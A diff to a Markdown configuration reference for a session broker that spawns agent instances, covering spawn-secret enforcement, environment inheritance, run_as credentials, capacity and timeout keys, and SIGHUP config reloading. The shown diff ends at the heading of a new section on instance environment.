@@ -2322,7 +2322,7 @@ operators normally set neither by hand:
 |---------------|--------|-----------------------------|-------------|
 | `broker_addr` | string | `$NEXUS_BROKER_ADDR`        | WebSocket URL of the broker's instance dial-back endpoint (e.g. `ws://127.0.0.1:8080/instance`). Falls back to the `NEXUS_BROKER_ADDR` env var. When empty the plugin stays dormant (no dial). |
 | `lease_id`    | string | `$NEXUS_BROKER_LEASE_ID`    | Lease id assigned by the broker at spawn; echoed in the `register` frame. Falls back to the `NEXUS_BROKER_LEASE_ID` env var. When empty the plugin stays dormant. |
-| `spawn_secret` | string | `$NEXUS_BROKER_SPAWN_SECRET` | Per-spawn secret the broker generates for this instance and injects at exec; echoed in the `register` frame alongside `lease_id`. Falls back to the `NEXUS_BROKER_SPAWN_SECRET` env var. Empty is valid and does **not** make the plugin dormant — a broker with no `auth:` block does not check it, unless the lease was restored after a broker restart. |
+| `spawn_secret` | string | `$NEXUS_BROKER_SPAWN_SECRET` | Per-spawn secret the broker generates for this instance and injects at exec; echoed in the `register` frame alongside `lease_id`. Falls back to the `NEXUS_BROKER_SPAWN_SECRET` env var. Empty does **not** make the plugin dormant — it dials and is refused. Every broker requires it, with or without an `auth:` block. |
 
 The `spawn_secret` is a **second factor for the dial-back socket**. The lease id
 alone is a poor authenticator for it: the same value appears in `ws_url`s, client
@@ -2340,15 +2340,16 @@ recompute the value a surviving instance still holds; the secret itself is still
 never written to disk. See
 [Restart recovery](#restart-recovery-reattach_window).
 
-Enforcement on the broker side is **gated on the broker having an `auth:` block**
-(see the Session broker section below), with one exception. With no `auth:` block
-the secret is ignored, so a `nexus` build that predates the protocol keeps
-working wherever the broker's [binary registry](#binary-registry-binaries) points
-at one; with one configured, such a build is refused and the broker logs a
-message naming version skew as the likely cause. The exception is a
-lease **restored after a broker restart**, which always requires the secret
-regardless of `auth:` — a live pid is not proof of identity. The value is never
-logged and never appears in `GET /leases`.
+Enforcement on the broker side is **unconditional**: every register frame must
+carry the secret, with or without an `auth:` block, on a freshly claimed lease or
+on one restored after a broker restart. It used to be gated on `auth:`, which
+meant an unauthenticated broker authenticated its dial-back socket with a lease id
+alone — a value that travels in `ws_url`s, client requests and logs. **A `nexus`
+build that predates the protocol is therefore now refused everywhere**, and
+removing the `auth:` block is no longer a workaround; upgrade the binary the
+[binary registry](#binary-registry-binaries) entry points at. The value is never
+logged and never appears in `GET /leases`. See
+[Instance dial-back authentication](#instance-dial-back-authentication-ws-instance).
 
 **Outbound IO messages** (instance → broker → client, JSON inside the frame
 payload): `output`, `stream.delta`, `stream.end`, `status`, `approval.request`,
@@ -3289,10 +3290,29 @@ binaries:
     env:
       NEXUS_VISION: "1"
 
-max_concurrent: 8
+# Optional. Variables a spawn inherits from the BROKER'S own environment, by
+# name. A spawn is otherwise built from scratch — no wildcard is supported.
+inherit_env:
+  - ANTHROPIC_API_KEY
+
+# Optional. Default OS credential for entries that declare none. Needs a
+# privileged broker (root, or CAP_SETUID and CAP_SETGID).
+# run_as:
+#   uid: 1500
+#   gid: 1500
+
+max_concurrent: 8             # a HEADCOUNT, not a resource budget; see below
+client_replay_buffer_bytes: 1048576   # per-lease client-bound replay retention (1 MiB)
 idle_timeout: 5m
+max_turn_duration: 30m        # bound on an in-flight turn; <=0 disables the bound
 queue_wait_timeout: 30s
+max_queue_depth: 64           # ceiling on parked over-capacity claims; <=0 = unlimited
+max_leases_per_principal: 0   # 0 = off; needs `auth:` to have any effect
+max_queued_per_principal: 0   # 0 = off; needs `auth:` to have any effect
 release_grace: 10s
+ready_timeout: 30s            # ceiling on instance BOOT; raise it for a slow-starting config
+session_report_grace: 5s      # post-ready wait for the instance's session id
+max_claim_body: 1048576       # ceiling on the claim request body (1 MiB); it carries the whole config
 state_dir: ""                 # empty = lease state is in-memory only; see below
 broker_id: ""                 # empty = generated once and persisted in state_dir
 reattach_window: 60s          # how long a lease restored after a restart waits for its instance
@@ -3337,20 +3357,99 @@ auth:
 | `listen_addr`        | string   | `:8080`  | host:port the broker's HTTP/WS gateway binds to. `GET /healthz` returns `{"status":"ok"}`. |
 | `advertise_addr`     | string   | *(empty)* | The address **clients** use to reach **this** broker, and the highest-precedence input to the `ws_url` returned by `POST /claim`. Accepts a bare `host:port` (implying `ws://`) or a scheme-qualified `ws://`, `wss://`, `http://` or `https://` host — the port is optional in that form, and `http`/`https` are normalized to `ws`/`wss`. **Required whenever the broker sits behind a reverse proxy or load balancer**, or whenever `listen_addr` uses a wildcard/empty host (`:8080`, `0.0.0.0:8080`, `[::]:8080`): without it the `ws_url` is derived from the claim request's `Host` header, which then names the proxy rather than the broker holding the lease. Validated at boot — a value with no port, a wildcard host (`0.0.0.0`, `::`), an unsupported scheme, or any path/query/fragment/userinfo **fails startup**. Leave it empty for a directly-reachable broker; the `ws_url` then resolves exactly as it did before this key existed. See [`ws_url` resolution](#ws_url-resolution) below. |
 | `binaries`           | map      | *(synthesized)* | The registry of named `nexus` variants this broker may spawn, keyed by the name a claim selects. Entry fields are listed under [Binary registry](#binary-registry-binaries) below. After a successful load the registry **always** contains a `nexus` entry — the name is reserved and an operator's block can add to the registry but cannot remove it. Omit the key entirely and the registry is synthesized as a single `nexus` entry with path `nexus`, which is exactly the pre-registry behaviour. Validated at boot: an entry with an empty name, an empty/missing `path`, or a name that collides with another after trimming **fails startup**, and so does **any entry whose `path` does not resolve to an executable file** — see [Binary resolution](#binary-resolution) below. |
+| `inherit_env`        | list of string | *(empty)* | The variables a spawned instance inherits from the **broker's own environment**, by **name** only. A spawn carries the always-pass set (`HOME`, `LANG`, `PATH`, `TZ`), everything named here that the broker process actually holds, its entry's [`env`](#binary-registry-binaries), and the three broker-owned `NEXUS_BROKER_*` variables — **and nothing else**. Empty (the default) means an instance carries no provider credential from the broker's shell, which is a **deliberate break** with the earlier behaviour of passing `os.Environ()` through wholesale; see [Instance environment](#instance-environment-inherit_env) below and the guide's migration note. Entries are trimmed, de-duplicated and sorted at load. An empty entry, a `NAME=value` pair (this key forwards a variable, it does not set one — use `binaries.<name>.env` for that) or a `NEXUS_BROKER_*` name (injected by the broker on every spawn, so declaring it does nothing) is a **boot failure** naming the key. A declared name the broker does not hold is **not** an error: it is skipped, omitted from the per-entry boot log line, and named once in a startup `WARN`. |
+| `run_as`             | map      | *(absent)* | The **default OS credential** spawned instances run under — `uid` and `gid`, both required whenever the block is written — for every `binaries:` entry that does not declare its own. Absent (the default) means instances run as the broker's own uid and gid, exactly as they always have, and the spawn is byte-identical to what it was before this key existed. An entry's [`run_as`](#binary-registry-binaries) **replaces** this outright rather than merging field by field. Validated at boot: a block with only one of the two fields, a negative id, or an id above 4294967295 **fails startup** naming the key (and, for an entry, the entry). Requires the broker to run as **root** or hold `CAP_SETUID` **and** `CAP_SETGID`; otherwise every claim selecting such an entry fails to spawn. See [Running instances as another user](#running-instances-as-another-user-run_as) below. |
 | `nexus_binary_path`  | string   | `nexus`  | **Deprecated — use `binaries.nexus.path`.** Path to the `nexus` binary the broker exec()s to spawn instances. Funneled through `ExpandPath` (supports `~`). Still honoured so existing deployments boot unchanged: when it is set and `binaries.nexus` is **absent**, its value is folded into the reserved `nexus` entry and the broker logs one `WARN` naming the replacement key. Setting it **and** `binaries.nexus` is a **boot failure** naming both keys — see [Binary registry](#binary-registry-binaries). Setting it to the empty string is also a boot failure (remove the key to take the default). |
-| `max_concurrent`     | int      | `8`      | Maximum number of live instances (one per lease). Each `POST /claim` acquires a capacity slot **before** spawning, and the slot is freed on every teardown path (manual `POST /release`, idle, crash, and any failed/aborted claim), so the live count can never exceed this cap or drift. A claim that arrives at capacity does **not** fail outright: it parks in a FIFO wait queue bounded by `queue_wait_timeout` (see below). Set `max_concurrent` to `0` (or any non-positive value) to mean **unlimited** (no cap). |
-| `idle_timeout`       | duration | `5m`     | How long an instance may sit with no real client input before the broker releases it. "Activity" is **only** an inbound `io` frame flowing client → instance (user input); instance → client output, pings, and control frames do **not** reset the timer. The release reuses the `POST /release` teardown path (shutdown frame → `release_grace` → force-kill → reap), so the session is persisted and the client WS closes with the going-away status. A background sweeper polls at `min(idle_timeout/4, 15s)` (floored at `50ms`). Set `idle_timeout` to `0` (or any non-positive value) to **disable** idle reaping entirely. |
+| `max_concurrent`     | int      | `8`      | Maximum number of live instances (one per lease). Each `POST /claim` acquires a capacity slot **before** spawning, and the slot is freed on every teardown path (manual `POST /release`, idle, crash, and any failed/aborted claim), so the live count can never exceed this cap or drift. A claim that arrives at capacity does **not** fail outright: it parks in a FIFO wait queue bounded by `queue_wait_timeout` (see below). Set `max_concurrent` to `0` (or any non-positive value) to mean **unlimited** (no cap). It is a **headcount, not a resource budget**: an instance pinning a 200k-token context counts exactly one, the same as an idle one, and the key bounds nothing about the memory, CPU or disk those instances hold. There is deliberately no per-lease resource limit in the broker — that belongs to the deployment (a systemd slice, a cgroup, one container per instance), so size this key such that `max_concurrent` × the per-instance limit fits the host. It is also **global**, not per [`binaries:`](#binary-registry-binaries) entry: one variant can fill it for every other. |
+| `client_replay_buffer_bytes` | int | `1048576` (1 MiB) | How many bytes of **already-sent, client-bound frames** each lease retains so a client that missed them can be replayed. The broker stamps a **monotonic, per-lease sequence** (`seq`, counting from 1) on every frame it sends a lease's client, and keeps the encoded bytes here, evicting **oldest first** once the bound is reached. Both of the gateway's loss paths — no client attached, and an attached client whose send queue is full — retain the frame rather than discarding it, so the gap is both **detectable** (the sequence jumps) and **recoverable** (the frames are still held). Only client-bound frames are sequenced and buffered: instance-bound frames carry no `seq` and are not retained, so nothing on the dial-back side changed. The bound is in **bytes, not frames**, because client-bound payloads run from a few-byte token delta to a hundred-kilobyte tool result — a frame count would say nothing about memory. **Worst-case memory across the broker is this value × [`max_concurrent`](#session-broker-nexus-broker)** — 8 MiB at both defaults; with `max_concurrent: 0` (unlimited) it is unbounded, so pair the two. A single frame larger than the whole bound is not retained at all (it is evicted immediately) rather than breaching the bound. Set it to `0` to **disable retention** while leaving sequencing intact: loss stays visible to the client, but the broker keeps nothing to replay. A **negative** value is a boot failure naming the key. Clients reach the retained frames with [`?from_seq=`](#ws-leaselease_id-http-api-not-yaml) on the client socket, which replays the retained tail before the live stream and announces an explicit `stream-gap` frame when the bound can no longer cover the requested resume point. The buffer is **in-memory and dies with the lease**: it is never journaled, `state_dir` does not persist it, and a broker restart starts every lease's sequence again at 1 with an empty buffer. |
+| `idle_timeout`       | duration | `5m`     | How long a lease with **no turn in flight** may sit with no client activity before the broker releases it, with the terminal reason `idle`. "Activity" is an inbound `io` frame flowing client → instance (user input) **or** the moment the instance reports its turn finished; instance → client output mid-turn, pings, and control frames do **not** reset the timer. A lease whose instance is **working** is exempt regardless of how long ago the client last typed — the broker reads the `io.status` state off the instance's own frames, treats `thinking`, `tool_running`, `streaming`, `waiting` and `cancelling` as a live turn and `idle` as its end, and bounds the exemption with [`max_turn_duration`](#session-broker-nexus-broker). So this key is sized to the longest **human pause** a session should survive, not to the longest **turn** an agent might take. The release reuses the `POST /release` teardown path (shutdown frame → `release_grace` → `SIGTERM` to the process group → `SIGKILL` → reap), so the session is persisted and the client WS closes with the going-away status. A background sweeper polls at `min(idle_timeout/4, 15s)` (floored at `50ms`). Set `idle_timeout` to `0` (or any non-positive value) to **disable** reaping entirely — which also switches off `max_turn_duration`, since the same sweeper enforces both. |
+| `max_turn_duration`  | duration | `30m`    | How long a **single in-flight turn** may exempt its lease from `idle_timeout` before the broker releases it anyway, with the distinct terminal reason `turn timeout` (not `idle`, so an operator reading the journal can tell "nobody was here" from "killed mid-work"). It is the backstop on the live-turn exemption: an instance that wedges, or whose tool never returns, never reports the `idle` state that settles a turn and would otherwise hold its lease — and its `max_concurrent` slot — for the lifetime of the broker. The clock starts at the **first** work state after a settled period and is *not* refreshed by later status frames, so it measures the whole turn rather than the gap between frames. Teardown is the ordinary shared path, identical to an idle release apart from the recorded reason. Set it to `0` (or any non-positive value) to **disable the bound**, restoring an unbounded exemption — a live turn then holds its lease indefinitely. It is enforced by the idle sweeper, so it is inert when `idle_timeout <= 0`. Size it above the longest turn this deployment legitimately runs: a lease reaped as `turn timeout` had work in progress. |
 | `queue_wait_timeout` | duration | `30s`    | How long an over-capacity `POST /claim` parks in the **FIFO capacity wait queue** before giving up. When `max_concurrent` is full, a claim waits in arrival order; the moment a slot frees (via `POST /release`, idle, or crash teardown) it is handed **directly** to the oldest waiter, which then spawns — no fresh claim can barge ahead of a longer-queued one, and the waiters reuse the same single slot counter (no second accounting path). A waiter that exceeds `queue_wait_timeout` returns **HTTP 503** `{"error":"capacity wait timed out"}` (distinct message from the immediate `{"error":"no capacity"}`). If the client disconnects while queued, the waiter is dropped from the queue and holds no slot. Set `queue_wait_timeout` to `0` (or any non-positive value) to **disable waiting**: an at-capacity claim is then rejected immediately with **HTTP 503** `{"error":"no capacity"}` (no instance spawned). |
-| `release_grace`      | duration | `10s`    | How long a release (manual `POST /release`, and later idle/crash teardown) waits for an instance to shut its engine down cleanly before the broker force-kills it. The graceful path always persists the session; the kill is the orphan-prevention backstop. |
+| `max_queue_depth`    | int      | `64`     | How many over-capacity claims may be **parked in the FIFO wait queue at once**. `max_concurrent` bounds live instances; this bounds the claims waiting behind them. Each parked waiter costs a goroutine, a timer and an open HTTP connection for up to `queue_wait_timeout`, so without this bound an over-capacity broker accumulates all three without limit. A claim arriving when the queue is already this deep is refused **immediately** — it is never parked and costs none of the above — with **HTTP 503** `{"error":"capacity queue full"}`. That is a **third distinct message**, so the three capacity refusals are told apart in a response and in the `claim failed` log line without correlating timings: `no capacity` (the cap is full and waiting is switched off), `capacity wait timed out` (this claim waited and gave up), `capacity queue full` (this claim was never allowed to wait). The bound is enforced **before** a capacity slot is taken, so a refused claim holds nothing and the slot counter cannot drift. Queue ordering is unchanged — still strictly FIFO by arrival, with a freed slot handed directly to the oldest waiter. Set it to `0` (or any non-positive value) to mean **unlimited**, restoring the pre-bound behaviour. |
+| `max_leases_per_principal` | int | `0` (off) | How many **live leases one authenticated principal** may hold at once. A claim from a principal already at this limit is refused with **HTTP 429** `{"error":"lease limit reached for this principal"}` — a **quota** answer, not one of the `503` capacity answers, because the broker may have slots to spare. The check runs **before** a capacity slot is taken and before the claim is queued, so an over-quota caller is refused instantly rather than parked only to be refused later, and it holds no slot to leak. It is exact rather than best-effort under parallel claims from one caller: the deciding check happens in the same critical section as the lease insert. **It is enforced only when [`auth:`](#session-broker-nexus-broker) is configured, and never for the anonymous principal** — with no `auth:` block every lease is owned by the same anonymous identity, so applying a per-principal cap there would count the whole broker against one principal and silently become a second, lower `max_concurrent`. A broker with no `auth:` block therefore behaves exactly as it did before this key existed, whatever it is set to. `0` (or any non-positive value) leaves the cap **off**, which is the default: a per-tenant quota is a policy only the operator can size. Restored leases (restart recovery) bypass it for the same reason they bypass `max_concurrent` — refusing a process that is already running would hide it, not stop it. |
+| `max_queued_per_principal` | int | `0` (off) | How many claims **one authenticated principal** may have parked in the FIFO capacity queue at once. It is what stops a single caller looping on `POST /claim` from occupying the whole queue and timing every other tenant's single claim out behind it. Over-quota claims are refused with **HTTP 429** `{"error":"queued claim limit reached for this principal"}`, immediately and without parking. Queue **ordering is not changed** — the queue stays strictly FIFO across all principals, and per-principal fair queueing is explicitly out of scope; this bounds how much of the queue one caller may hold, it does not reorder it. Gated on `auth:` and skipped for the anonymous principal **exactly as `max_leases_per_principal` is**, and off by default for the same reason. |
+| `release_grace`      | duration | `10s`    | How long a release (manual `POST /release`, and idle/crash/reattach teardown) waits for an instance to shut its engine down cleanly, after the `shutdown` frame, before the broker escalates. Escalation is `SIGTERM` to the instance's **process group**, then `SIGKILL` to the same group a fixed `2s` later — see [`POST /release/{lease_id}`](#post-releaselease_id-http-api-not-yaml). The graceful path (frame or `SIGTERM`) always persists the session; the kill is the orphan-prevention backstop. The second window is deliberately not configurable. |
+| `ready_timeout`      | duration | `30s`    | The ceiling on instance **boot**: how long `POST /claim` waits for a freshly spawned instance to dial back on `/instance` and signal ready before the broker gives up, kills the process, reaps it, drops the lease (freeing its capacity slot) and answers **HTTP 504** `{"error":"instance did not become ready in time"}`. It is the value most likely to need raising, because it has to cover process start, engine construction and **every plugin's `Init` and `Ready`** — a claim whose config pulls a long model list, warms a vector store or dials several MCP servers can legitimately take longer than the default, and before this key existed that surfaced as a 504 with nothing an operator could turn. It bounds the claim path only; it is unrelated to `idle_timeout` (a live lease) and `max_turn_duration` (a turn). The **same** window bounds an A2A cold spawn, since the [`agents:`](#agent-profiles-agents) ingress boots instances through the identical spawn spine. **Must be positive** — a non-positive or unparseable value is a **boot failure naming the key**; there is no "wait forever" reading, because an instance that never registers would otherwise hold a capacity slot and an open HTTP connection indefinitely. |
+| `session_report_grace` | duration | `5s`   | How long `POST /claim` waits, **after** the instance has signalled ready, for its session-id report frame. The `nexus.io.broker` plugin sends the report immediately after ready, so this is a short grace window rather than a boot budget. **Exceeding it is not an error**: the claim still succeeds and still returns `200`, just with the `session_id` key **omitted** from the response — the caller then has a usable lease it cannot later `-recall`, and the broker logs one `WARN`. Raise it only if instances are observed returning without a session id under load. **Must be positive** — a non-positive or unparseable value is a **boot failure naming the key**; `0` is not a supported way to skip the wait, because a fresh session whose id is never reported cannot be resumed. |
+| `max_claim_body`     | int      | `1048576` (1 MiB) | Ceiling, in **bytes**, on the `POST /claim` request body. A body past it is refused with **HTTP 400** `{"error":"invalid claim body"}` and **nothing is spawned**. It is sized to the config an operator ships, not to a protocol constant: a claim carries the **whole nexus config inline** (see [`POST /claim`](#post-claim-http-api-not-yaml)), so a deployment with a long `skills:` block, many MCP servers or an inlined system prompt can outgrow a megabyte. **Must be positive** — a non-positive or unparseable value is a **boot failure naming the key**; `0` would reject every claim. The A2A ingress's own body cap is a fixed 1 MiB and is **not** this key: a JSON-RPC envelope carries a message, not a config, so it has no reason to grow with one. |
 | `state_dir`          | string   | *(empty)* | Per-broker directory holding this broker's **lease journal** (`leases.jsonl`), its **session → binary index** (`session-binaries.jsonl`), its **A2A context → session index** (`a2a-contexts.jsonl`) and **A2A task store** (`a2a-tasks.jsonl`, both written only when `agents:` is configured), its **spawn-secret derivation key** (`spawn-key`, mode `0600`) and, when `broker_id` is unset, its generated identity (`broker-id`). Funneled through `ExpandPath` (supports `~`). **Empty (the default) disables lease persistence entirely**: nothing is written, no directory is created, spawn secrets stay random per spawn, restart recovery does not run, neither the session → binary index nor the A2A context index exists (an A2A conversation is then resumable only for as long as this process lives), the A2A task store is memory-only (`GetTask`/`ListTasks`/`SubscribeToTask` still answer, but only for tasks this process ran — see [A2A task retention](#a2a-task-retention-a2atasks)), and the broker behaves exactly as it did before this key existed — it logs one `WARN` at startup saying lease state is in-memory only. **Must not be shared between brokers**: two brokers pointed at one directory would append to the same journal and compact each other's live leases away. Created on demand (mode `0700`); a `state_dir` that is set but unusable **fails startup**. See [Lease durability](#lease-durability-state_dir), [A2A context → session index](#a2a-context--session-index-a2a-contextsjsonl) and [Restart recovery](#restart-recovery-reattach_window) below. |
 | `broker_id`          | string   | *(empty)* | The identity stamped on every persisted lease record, alongside `advertise_addr`, so a future shared store can tell whose lease is whose. Must be **stable across restarts** of the same broker. Empty (the default) means the broker generates one on first boot and persists it at `<state_dir>/broker-id`, reusing it thereafter — stable and unique with no operator effort. Set it explicitly to give a broker a name that means something in a cluster (`broker-eu-1`). Irrelevant while `state_dir` is unset, since nothing is then recorded. |
 | `reattach_window`    | duration | `60s`    | How long a lease **restored from the journal after a restart** may wait for its instance to reconnect before the broker reaps it (kills the process, frees the slot, closes the record out through the shared `POST /release` teardown). Only restored leases are subject to it; an ordinary claimed lease is never touched. A restored lease that reattaches inside the window becomes a fully ordinary lease — idle sweeping, crash watching, ownership checks and `POST /release` all apply to it unchanged. A non-positive value **falls back to the 60s default rather than disabling the reaper**: "wait forever" would leave a capacity slot held by an instance that is never coming back, which is the orphan restart recovery exists to remove. Irrelevant while `state_dir` is unset, since nothing is then restored. See [Restart recovery](#restart-recovery-reattach_window) below. |
-| `auth`               | map      | *(absent)* | Client authentication for the control-plane routes, **and** the gate for instance dial-back spawn-secret enforcement on `WS /instance`. **Absent means authentication is disabled** and every route behaves exactly as it did before the key existed; the broker logs one `WARN` at startup saying so. A **malformed** block is a boot failure naming the offending key — it never falls back to disabled. **Restored leases are the one exception**: they always require the spawn secret, whatever this key says (see [Restart recovery](#restart-recovery-reattach_window)). See [Authentication](#authentication-auth) below. |
+| `auth`               | map      | *(absent)* | Client authentication for the control-plane routes. It does **not** govern the instance dial-back on `WS /instance`, which always requires the per-spawn secret. **Absent means authentication is disabled** and every route behaves exactly as it did before the key existed; the broker logs one `WARN` at startup saying so. A **malformed** block is a boot failure naming the offending key — it never falls back to disabled. See [Authentication](#authentication-auth) below. |
 | `a2a`                | map      | *(absent)* | Settings shared by every [`agents:`](#agent-profiles-agents) profile. Today it holds one sub-block, `a2a.tasks`, which bounds the durable A2A **task store**. It is separate from `agents:` because nothing in it is per profile: the store is one file, with one retention policy, for the whole broker. Absent means every default below applies. See [A2A task retention](#a2a-task-retention-a2atasks). |
 | `a2a.tasks.ttl`      | duration | `24h`      | How long a **terminal** task stays readable after its last transition. `"0s"` keeps every task until a cap evicts it. Must be a duration **string** (`"24h"`, `"90m"`) — a bare number fails the boot rather than being read as nanoseconds. A negative value is a boot failure naming the key. See [A2A task retention](#a2a-task-retention-a2atasks). |
 | `a2a.tasks.max_per_context` | int | `50`   | How many tasks are kept per (**caller**, `contextId`) pair. `0` disables the cap. The cap is per caller as well as per context so one principal's traffic cannot evict another's — an eviction channel is still a channel. Only **terminal** tasks are evictable; a live task counts against the cap but is never dropped. A negative value is a boot failure. See [A2A task retention](#a2a-task-retention-a2atasks). |
 | `a2a.tasks.input_timeout` | duration | `15m` | How long a task may sit at `TASK_STATE_INPUT_REQUIRED` before the broker abandons it: the task is driven to `TASK_STATE_FAILED` and the instance is told to cancel the turn. `"0s"` disables the deadline. This is also the **queue deadlock policy** — a parked task holds its conversation's serial queue and its leased instance, so without a deadline one unanswered question would strand every message behind it. Must be a duration string; a negative value is a boot failure. See [Serial task queueing](#serial-task-queueing). |
 | `agents`             | map      | *(absent)* | The named **A2A agent profiles** this broker publishes, keyed by the name their routes are namespaced under. Each profile binds a Nexus config, a `binaries:` entry and an Agent Card, so a third-party A2A client can address an agent by URL instead of supplying the full nexus config `POST /claim` demands. Entry fields are listed under [Agent profiles](#agent-profiles-agents) below. **Absent (the default) means this broker has no A2A ingress at all** — no routes are registered and nothing new appears in the boot log, so a `broker.yaml` written before profiles existed behaves exactly as it did. Validated at boot: an empty or non-URL-safe profile name, a name that collides with another after trimming, a missing `config`, a `binary` that is not in the registry, a card missing a required field, or a config file that does not resolve to a readable file **fails startup**.
+
+### Reloadable keys (`SIGHUP`)
+
+The broker re-reads its config file on **`SIGHUP`** and applies the reloadable
+half of it in place, so adding a `binaries:` variant or publishing an `agents:`
+profile no longer costs a restart — and a restart is the single event that costs
+every lease whose instance fails to reattach within
+[`reattach_window`](#session-broker-nexus-broker).
+
+```bash
+kill -HUP "$(pgrep -f nexus-broker)"
+```
+
+**`SIGHUP` is the only trigger.** There is deliberately no `POST /reload`:
+`admin_scope` is a read-only capability ("visibility only — there is no admin
+bypass on release or connect"), and a mutating admin route would be the first
+exception to that.
+
+A reload is **validate-then-swap and atomic**. The file goes through exactly the
+boot loader, so a value that would have failed startup fails the reload; the
+Agent Cards are re-rendered before anything is published; and only when every
+step has succeeded is the new configuration swapped in, in one step. A reload
+that fails at any point leaves the previous configuration **entirely** in force
+and logs the reason — there is no half-applied state. Outcomes are logged as
+`config reload applied` (naming the keys that changed) or
+`config reload rejected` (naming the reason).
+
+**Live leases are never disturbed.** A reload changes what the *next* claim can
+spawn; it never signals, kills or re-binds a running instance. That includes
+removing a `binaries:` entry a live lease was spawned from: the lease records the
+entry *name*, the process is already running, and a later resume against a name
+this broker no longer offers is refused with the existing `409`.
+
+| Key | Reloadable? | Notes |
+|---|---|---|
+| `binaries` (and its folded inputs `nexus_binary_path`, `run_as`) | **Yes** | The next claim resolves its entry from the new registry. Paths are re-resolved, so a reload naming a missing or non-executable binary is **refused** exactly as a boot would be. |
+| `inherit_env` | **Yes** | Applies to the next spawn. |
+| `agents` | **Yes**, with one exception | Profiles may be added, changed or removed and the Agent Cards are re-rendered and swapped **as a unit**. The exception: a broker that booted with **no** `agents:` block registered no A2A routes and opened neither the context index nor the durable task store, so a reload cannot switch the ingress on — that change is reported and ignored. Removing the last profile is allowed; the routes then answer `404 unknown agent profile`. |
+| `max_concurrent` | **Yes** | Raising it immediately admits claims already parked in the capacity queue. Lowering it **never evicts** a live lease: the broker sits over its cap and admits nothing new until it drains back under. |
+| `idle_timeout`, `max_turn_duration` | **Yes** | The sweeper re-reads both each pass, and re-derives its tick interval, so switching reaping on or off takes effect within one poll. |
+| `queue_wait_timeout` | **Yes** | Applies to the next claim; a claim already parked keeps the bound it parked under. |
+| `release_grace` | **Yes** | Applies to the next release, manual or swept. |
+| `ready_timeout`, `session_report_grace`, `max_claim_body` | **Yes** | Applies to the next claim. |
+| `listen_addr` | **No** | Changing it means a new listener, which is a restart. |
+| `advertise_addr` | **No** | Stamped into each lease record at registration; changing it live would make this process's own records disagree. |
+| `state_dir` | **No** | The lease journal, spawn key and both indexes are already open against the old directory, and restart recovery has already run. |
+| `broker_id` | **No** | Already stamped on every record this broker has written; changing it live would orphan its own leases at the next boot. |
+| `auth` (including `auth.admin_scope`) | **No** | The `jwks` validator holds a live `kid` cache with rate-limited fetches, and two documented guarantees rest on it surviving: key rotation needs no restart, and an unreachable issuer never turns into an allow. Rebuilding the chain would discard that cache, so a reload performed during an IdP outage would turn a working broker into one that denies every JWT. |
+| `reattach_window` | **No** | Consumed once, at boot, by the restored-lease reaper. |
+| `client_replay_buffer_bytes` | **No** | Stamped on a lease's stream when the lease is created. |
+| `max_queue_depth`, `max_leases_per_principal`, `max_queued_per_principal` | **No** | Admission state held by the registry rather than read per request. |
+| `a2a.tasks.*` | **No** | Sizes a durable store that is already open, on the same footing as `state_dir`. |
+
+A boot-only key whose value **changed** in the reloaded file is reported in a
+startup-style `WARN` naming every such key and is **ignored** — the value in
+force is unchanged. The reloadable keys in the same document still apply: a
+boot-only change is not a reason to refuse everything around it.
+
+### Values that stay constants
+
+Not every number in the broker is a key. These are fixed on purpose, and the
+reason differs per value:
+
+| Value | Fixed at | Why it is not a key |
+|---|---|---|
+| WebSocket **ticket TTL** | `30s` | A ticket travels in a **URL query parameter** — a browser cannot set a header on a WebSocket handshake — so it lands in reverse-proxy access logs, browser history and referrer chains no matter what the broker does. Its tightness plus its **single use** *are* the mitigation for that exposure, so letting an operator widen it would let them silently remove the only thing that makes the design safe. A dropped socket is answered by [`POST /ticket/{lease_id}`](#post-ticketlease_id-http-api-not-yaml) minting a fresh one, not by a longer window. |
+| `SIGTERM` → `SIGKILL` gap | `2s` | Not the operator's shutdown budget — [`release_grace`](#session-broker-nexus-broker) is, and it has already elapsed by the time this window opens. This is only the interval between "we have now actually asked the OS" and "we stop asking". |
+| A2A request body cap | 1 MiB | A JSON-RPC envelope carries a **message**, not a config, so it has no reason to grow with an operator's profiles the way [`max_claim_body`](#session-broker-nexus-broker) does. |
+| Lease-journal compaction interval, session→binary index cap | 512 appends, 4096 entries | Internal storage tuning with no operator-visible behaviour to trade off. |
 
 ### Binary registry (`binaries`)
 
@@ -3378,7 +3477,8 @@ binaries:
 | `label`       | string            | *(empty)*  | Short human-readable name for operator/client surfaces (`"Nexus (vision)"`). Purely presentational; nothing routes on it. Consumers fall back to the entry name when empty. |
 | `description` | string            | *(empty)*  | One-line explanation of what this variant is for, for the same surfaces as `label`. Purely presentational. |
 | `args`        | list of string    | *(empty)*  | Extra argv entries for this variant, appended **after** the broker's own spawn arguments so they can add to the command line but never displace the `-config` / `-recall` contract the instance protocol depends on. |
-| `env`         | map string→string | *(empty)*  | Extra environment variables for this variant, layered **under** the broker-owned `NEXUS_BROKER_*` variables. Those name the dial-back address, the lease and the spawn secret; the broker's values always win, so an entry cannot point an instance at another broker or hand it the wrong lease. |
+| `env`         | map string→string | *(empty)*  | Extra environment variables for this variant, layered **over** what the spawn inherited from the broker (the always-pass set and [`inherit_env`](#instance-environment-inherit_env)) and **under** the broker-owned `NEXUS_BROKER_*` variables. Those name the dial-back address, the lease and the spawn secret; the broker's values always win, so an entry cannot point an instance at another broker, hand it the wrong lease, or supply its own spawn secret. This is where a value that is a property of the **variant** belongs; `inherit_env` is where a value that lives in the **broker's own environment** belongs. |
+| `run_as`      | map               | *(absent)* | The OS credential **this entry's** instances are exec()d under: `uid` and `gid`, both required whenever the block is written. Overrides the broker-level [`run_as`](#session-broker-nexus-broker) outright — an entry that declares it does not merge with the default. Absent and with no broker-level default, instances run as the broker's own user, which is what every spawn did before this key existed. When it is set, **`HOME` follows the credential**: the spawn's `HOME` is the `run_as` user's home directory from the passwd database, unless this entry's `env` sets `HOME` itself. A uid whose home cannot be resolved and whose entry does not set `env.HOME` **fails startup** naming the entry. Supplementary groups are **dropped** (`setgroups(0, NULL)`), so the instance holds only the declared gid. See [Running instances as another user](#running-instances-as-another-user-run_as). |
 
 **Selecting an entry.** A claim picks one with the optional `binary` field of
 its request body — see [`POST /claim`](#post-claim-http-api-not-yaml). An unknown
@@ -3403,6 +3503,199 @@ boot, from the same file, in exactly four cases:
 | set     | absent  | The value becomes the `nexus` entry's `path`, and one `WARN` names `binaries.nexus.path` as the replacement. Every pre-registry deployment boots unchanged. |
 | absent  | set     | Taken as written; nothing to fold. |
 | set     | set     | **Boot failure** naming both keys. Picking a winner would mean half the operators hitting it silently spawn the binary they did not mean, and the mistake would only surface as instances behaving oddly. |
+
+### Instance environment (`inherit_env`)
+
